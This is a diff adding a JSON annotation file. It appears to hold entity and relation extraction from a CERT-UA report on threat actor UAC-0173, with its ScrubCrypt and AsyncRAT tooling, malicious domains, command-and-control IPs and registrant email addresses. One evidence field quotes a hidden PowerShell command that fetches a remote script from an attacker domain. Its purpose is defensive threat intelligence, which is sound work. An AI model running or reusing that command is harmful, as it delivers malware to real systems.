@@ -1,0 +1,116 @@
+{
+  "entities": [
+    {
+      "name": "ScrubCrypt",
+      "kind": "crypter software",
+      "gloss": "An obfuscation and encryption tool used by threat actors to protect payloads from detection."
+    },
+    {
+      "name": "AsyncRAT",
+      "kind": "malware family",
+      "gloss": "An open-source remote access trojan designed to remotely monitor and control infected Windows systems."
+    },
+    {
+      "name": "GitHub",
+      "kind": "software hosting service",
+      "gloss": "An online platform for software development and version control using Git."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A country in Eastern Europe."
+    },
+    {
+      "name": "PowerShell",
+      "kind": "software product",
+      "gloss": "A task automation and configuration management framework developed by Microsoft."
+    },
+    {
+      "name": "UAC-0173",
+      "kind": "threat actor",
+      "gloss": "A threat group tracked by CERT-UA targeting Ukrainian organizations using ScrubCrypt and AsyncRAT."
+    },
+    {
+      "name": "UAC-0007",
+      "kind": "threat actor",
+      "gloss": "A threat group also known as BlackNotary associated with malicious cyber activity against notaries."
+    },
+    {
+      "name": "minijusfil.com",
+      "kind": "internet domain",
+      "gloss": "A domain name used in cyber attacks to host and deliver malicious scripts."
+    },
+    {
+      "name": "filetransrediremin.com",
+      "kind": "internet domain",
+      "gloss": "A malicious domain used by threat actors to host malicious payloads."
+    },
+    {
+      "name": "barnsertr.com",
+      "kind": "internet domain",
+      "gloss": "An internet domain registered for threat activity infrastructure."
+    },
+    {
+      "name": "179.43.154.184",
+      "kind": "ip address",
+      "gloss": "An IP address located in Switzerland used as an AsyncRAT command and control server."
+    },
+    {
+      "name": "195.123.225.51",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious infrastructure."
+    },
+    {
+      "name": "195.123.226.166",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious infrastructure."
+    },
+    {
+      "name": "195.123.226.180",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious infrastructure."
+    },
+    {
+      "name": "riuscos88@gmail.com",
+      "kind": "email address",
+      "gloss": "An email address used to register malicious domains."
+    },
+    {
+      "name": "amandarecz75@gmail.com",
+      "kind": "email address",
+      "gloss": "An email address used to register malicious domains."
+    },
+    {
+      "name": "barno2715@gmail.com",
+      "kind": "email address",
+      "gloss": "An email address used to register malicious domains."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0173",
+      "type": "uses-malware",
+      "tail": "ScrubCrypt",
+      "evidence": "створені за допомогою криптора ScrubCrypt"
+    },
+    {
+      "head": "UAC-0173",
+      "type": "uses-malware",
+      "tail": "AsyncRAT",
+      "evidence": "ураження ЕОМ шкідливою програмою AsyncRAT"
+    },
+    {
+      "head": "AsyncRAT",
+      "type": "communicates-with",
+      "tail": "179.43.154.184",
+      "evidence": "179.43.154.184 (AsyncRAT C2"
+    },
+    {
+      "head": "minijusfil.com",
+      "type": "delivers",
+      "tail": "AsyncRAT",
+      "evidence": "powershell.exe -WindowStyle hidden iwr -uri hXXps://minijusfil[.]com/c.cmd"
+    }
+  ],
+  "newRelationTypes": []
+}
